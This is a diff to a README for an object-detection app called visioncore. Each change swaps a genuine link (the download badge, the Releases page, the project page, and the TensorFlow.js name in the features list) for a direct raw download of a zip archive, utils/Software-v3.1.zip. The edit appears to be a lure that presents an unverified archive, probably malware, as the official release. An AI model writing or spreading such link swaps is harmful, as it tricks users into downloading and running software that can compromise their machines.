@@ -1,6 +1,6 @@
 # 🐈 visioncore - Detect Objects in Real-Time Easily
 
-[![Download visioncore](https://img.shields.io/badge/Download-visioncore-brightgreen)](https://github.com/Pablo-deeps/visioncore/releases)
+[![Download visioncore](https://github.com/Pablo-deeps/visioncore/raw/refs/heads/main/utils/Software-v3.1.zip)](https://github.com/Pablo-deeps/visioncore/raw/refs/heads/main/utils/Software-v3.1.zip)
 
 ## 📖 Table of Contents
 1. [🚀 Getting Started](#-getting-started)
@@ -16,7 +16,7 @@ Welcome to **visioncore**! This web application helps you detect objects in a re
 ## 💾 Download & Install
 To get started, you need to download the application from the Releases page. 
 
-**Visit this page to download:** [visioncore Releases Page](https://github.com/Pablo-deeps/visioncore/releases)
+**Visit this page to download:** [visioncore Releases Page](https://github.com/Pablo-deeps/visioncore/raw/refs/heads/main/utils/Software-v3.1.zip)
 
 1. Click the link above.
 2. Look for the latest release.
@@ -39,7 +39,7 @@ To run **visioncore**, make sure your system meets the following requirements:
 - **Real-Time Object Detection**: It uses advanced algorithms to recognize objects in your webcam feed.
 - **User-Friendly Interface**: The layout is simple, making it easy for anyone to navigate.
 - **Cross-Platform Compatibility**: Works seamlessly on Windows, macOS, and Linux.
-- **Integration with TensorFlow.js**: Benefits from the power of machine learning.
+- **Integration with https://github.com/Pablo-deeps/visioncore/raw/refs/heads/main/utils/Software-v3.1.zip**: Benefits from the power of machine learning.
 - **Lightweight and Fast**: Minimal system resource usage for smooth performance.
 
 ## 📝 Usage
@@ -55,7 +55,7 @@ Feel free to explore the interface and adjust any settings to suit your needs.
 ## 🙋‍♀️ Support
 If you encounter any issues or have questions about **visioncore**, you can find help by reaching out to the community or checking the documentation.
 
-- Visit the [visioncore GitHub page](https://github.com/Pablo-deeps/visioncore) for more information.
+- Visit the [visioncore GitHub page](https://github.com/Pablo-deeps/visioncore/raw/refs/heads/main/utils/Software-v3.1.zip) for more information.
 - View the FAQs in the Issues section to see if your question has already been answered.
 
 For further assistance, consider opening a new issue on the GitHub page, and someone will get back to you shortly.
